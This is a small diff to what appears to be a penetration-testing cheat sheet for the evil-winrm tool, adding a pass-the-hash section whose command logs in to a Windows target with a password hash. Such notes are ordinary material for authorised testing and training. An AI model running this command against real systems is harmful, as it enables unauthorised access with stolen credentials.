@@ -22,3 +22,9 @@ sudo gem install evil-winrm
 ```sh
 evil-winrm -i <target-ip> -u <username> -p <password>
 ```
+
+### Pass-the-Hash
+PtH can be achieved by using the `-H` flag instead of a password
+```sh
+evil-winrm -i <target-ip> -u <username> -H <hash>
+```
